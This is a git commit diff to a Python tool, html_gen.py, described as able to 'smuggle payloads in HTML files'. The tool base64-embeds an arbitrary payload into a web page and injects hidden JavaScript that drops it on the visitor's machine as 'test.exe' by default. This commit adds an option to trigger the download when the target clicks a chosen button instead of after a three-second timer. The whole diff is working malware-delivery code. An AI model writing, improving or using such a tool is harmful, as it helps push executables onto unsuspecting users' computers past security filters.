558724832e02ba45b3f2d27d18cc15c8da013ae6
strombach <fredde.stromback@gmail.com>
2024-11-01 17:37:44 +0100

    Now user can choose between auto download or if the target need to click a button

--- Projekt/toolbox/html_gen.py
+++ Projekt/toolbox/html_gen.py
@@ -7,36 +7,66 @@ HELP_STRING = """
         Smuggle payloads in HTML files.
         """
 
-def create_javascript(data, fileName):
-    return f"""
-        const data = window.atob("{data}")
-        const fileName = "{fileName}"
+def create_javascript(data, fileName, button):
+    print(button)
+    if button is not None:
+        return f"""
+        function clickToDownload() {{
+            const data = window.atob("{data}")
+            const fileName = "{fileName}"
 
-        const blob = new Blob([data], {{type: 'octet/stream'}})
+            const blob = new Blob([data], {{type: 'octet/stream'}})
 
-        const a = document.createElement('a')
-        document.body.appendChild(a)
-        a.style = 'display: none'
-        const url = window.URL.createObjectURL(blob)
-        a.href = url;
-        a.download = "{fileName}"
-        setTimeout(() => {{a.click()}}, "3000")
-        window.URL.revokeObjectURL(url)
+            const a = document.createElement('a')
+            document.body.appendChild(a)
+            a.style = 'display: none'
+            const url = window.URL.createObjectURL(blob)
+            a.href = url;
+            a.download = "{fileName}"
+            a.click()
+            window.URL.revokeObjectURL(url)
+        }}
     """
+    else:
+        return f"""
+            const data = window.atob("{data}")
+            const fileName = "{fileName}"
+
+            const blob = new Blob([data], {{type: 'octet/stream'}})
+
+            const a = document.createElement('a')
+            document.body.appendChild(a)
+            a.style = 'display: none'
+            const url = window.URL.createObjectURL(blob)
+            a.href = url;
+            a.download = "{fileName}"
+            setTimeout(() => {{a.click()}}, "3000")
+            window.URL.revokeObjectURL(url)
+        """
 
 def main(flags):
+
+    with open(flags.htmlfile, "r", encoding="utf-8") as original_file:
+        html_content = original_file.read()
 
     with open(f"{flags.payload}", "rb") as payload_file:
         binary_data = payload_file.read()
         encoded_data = base64.b64encode(binary_data).decode()
 
-    with open(flags.htmlfile, "r", encoding="utf-8") as original_file:
-        html_content = original_file.read()
-
     soup = BeautifulSoup(html_content, "html.parser")
-
     new_script = soup.new_tag("script")
-    new_script.string = create_javascript(encoded_data, flags.downloadname)
+
+    if flags.button:
+        btn = soup.find(attrs={"id": flags.button})
+        btn["onClick"] = "clickToDownload()"
+        new_script.string = create_javascript(encoded_data, flags.downloadname, flags.button)
+    else:
+        new_script.string = create_javascript(encoded_data, flags.downloadname, None)
+
+
+
+
+
     soup.body.append(new_script)
 
     with open("modified_index.html", "w", encoding="utf-8") as new_file:
@@ -50,11 +80,12 @@ if __name__ == "__main__":
     )
 
     # Mandatory
-    parser.add_argument("-p","--payload", help="The payload to embed in the html", required=True)
-    parser.add_argument("-hf","--htmlfile", help="The html file to embed into", required=True)
+    parser.add_argument("-p","--payload", help="The payload to embed in the html.", required=True)
+    parser.add_argument("-hf","--htmlfile", help="The html file to embed into.", required=True)
 
     # Optional
     parser.add_argument("-dn","--downloadname", default="test.exe", help="The name of the file when downloaded")
+    parser.add_argument("-bid","--button", help="The id of the button to click to download file.")
 
     argparse_args = parser.parse_args()
 
